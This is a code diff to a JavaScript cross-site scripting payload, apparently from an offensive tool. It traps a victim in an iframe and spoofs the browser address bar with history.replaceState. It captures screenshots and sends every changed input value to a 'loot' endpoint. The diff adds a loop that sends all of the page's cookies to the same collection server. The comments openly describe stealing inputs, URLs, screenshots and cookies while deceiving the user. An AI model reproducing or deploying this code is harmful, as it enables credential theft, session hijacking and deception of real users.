@@ -135,7 +135,7 @@ function sendScreenshot()
 		setTimeout(function () {}, 3000);
 		loaded = true;
 	}
-	console.log("---Snagging screenshot...");
+	// console.log("---Snagging screenshot...");
 
 //	html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
@@ -176,21 +176,21 @@ function sendScreenshot()
 
 
 
-// Snag the path of the iframe, and fake it in the browser
-// address bar. It'll look like they're surfing the site
-// Note: if the user refreshes the page, the gig is up
-// and your XSS will stop executing. But as long as they
-// keep clicking around, you keep control and you XSS 
-// keeps running
+// When this update fires, it checks the iframe trap URL
+// where the user thinks they are, then does a lot of things
+// Steals inputs, URL, screenshots, etc. 
+// Also updates their browser address bar so they 
+// think they're on the page they're viewing in the
+// iframe trap, not the one with the XSS vuln. 
 function updateUrl()
 {
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
 
+	// New page, let's steal stuff
 	if (lastFakeUrl != fakeUrl)
 	{
 		// Handle URL recording
-		console.log("New URL to fake!");
-		console.log("url: " + fakeUrl);
+		console.log("New trap URL, stealing the things: " + fakeUrl);
 		lastFakeUrl = fakeUrl;
 
 		// This needs an API call to report the new page
@@ -213,11 +213,12 @@ function updateUrl()
 		for (index = 0; index < inputs.length; index++)
 		{
 			//console.log("++ Registering input callballback for index: " + index)
+			// Adding event listeners to fire when the value in submitted 
 			addEventListener(inputs[index], (event) => updateInput);
 			inputs[index].addEventListener("change", function(){
 				inputName = this.name;
 				inputValue = this.value;
-				console.log("!!!! Input: " + inputName + " changed to: " + inputValue);
+				// console.log("!!!! Input: " + inputName + " changed to: " + inputValue);
 
 				request = new XMLHttpRequest();
 				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
@@ -228,14 +229,35 @@ function updateUrl()
 				var jsonString = JSON.stringify(jsonObj);
 				request.send(jsonString);
 			});
+		}
 
 
+		// Handle Cookies
+		cookieArray = document.cookie.split(';');
+		for (index = 0; index < cookieArray.length; index++)
+		{
+			// console.log("++ Cookie loop: " + index);
+			cookieData = cookieArray[index].split('=');
+			// console.log("cookieName: " + cookieData[0]);
+			// console.log("cookieValue: " + cookieData[1]);
+
+			request = new XMLHttpRequest();
+			request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
+			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			var jsonObj = new Object();
+			jsonObj["cookieName"] = cookieData[0];
+			jsonObj["cookieValue"] = cookieData[1];
+			var jsonString = JSON.stringify(jsonObj);
+			request.send(jsonString);
 		}
 	}
-	else
-		console.log("Fake URL doesn't need updating");
+	// else
+	// 	console.log("Fake URL doesn't need updating");
 
-	//console.log("Fake url is: " + fakeUrl);
+
+
+
+	// Fake the URL that the user sees. This is important. 
 	window.history.replaceState(null, '', fakeUrl);
 }
 
